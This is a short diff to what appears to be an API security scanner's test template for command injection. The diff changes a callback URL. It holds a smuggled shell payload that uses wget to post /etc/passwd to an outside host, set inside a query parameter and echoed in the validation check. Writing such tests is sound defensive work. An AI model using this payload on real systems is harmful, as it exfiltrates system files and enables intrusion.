@@ -35,7 +35,7 @@ execute:
       - modify_method: GET
       - modify_url: "/api/getServices"
       - add_query_param:
-          !!str name[]: "$(wget%20--post-file%20/etc/passwd%20https://test-services.akto.io/store_uuid/${random_uuid})"
+          !!str name[]: "$(wget%20--post-file%20/etc/passwd%20https://test-services.akto.io/${random_uuid})"
       - replace_body: '{}'
       
 validate:
@@ -43,7 +43,7 @@ validate:
     eq: 200
   response_payload:
     contains_all:
-      - "wget --post-file /etc/passwd https://test-services.akto.io/store_uuid/${random_uuid}"
+      - "wget --post-file /etc/passwd https://test-services.akto.io/${random_uuid}"
       - name
       - running
       - pids
